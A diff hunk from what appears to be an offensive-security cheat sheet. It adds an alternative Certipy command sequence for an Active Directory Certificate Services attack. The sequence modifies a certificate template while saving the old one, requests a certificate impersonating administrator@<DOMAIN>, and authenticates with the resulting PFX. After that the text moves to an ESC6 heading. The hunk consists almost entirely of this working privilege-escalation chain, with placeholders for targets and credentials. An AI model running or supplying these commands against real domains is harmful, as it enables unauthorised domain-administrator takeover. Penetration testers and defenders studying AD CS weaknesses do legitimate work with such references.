@@ -4358,6 +4358,14 @@ certipy req -ca '<CA>' -username <USERNAME>@<DOMAIN> -password <PASSWORD> -targe
 certipy auth -pfx administrator.pfx -dc-ip <RHOST>
 ```
 
+or
+
+```c
+certipy template -username <USERNAME>@<DOMAIN> -password <PASSWORD> -template <TEMPLAET> -save-old
+certipy req -ca '<CA>' -dc-ip <RHOST> -u <USERNAME> -p '<PASSWORD>' -template <TEMPLATE> -target <RHOST> -upn administrator@<DOMAIN> -debug
+certipy auth -pfx administrator.pfx -dc-ip <RHOST>
+```
+
 ##### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
 
 ```c
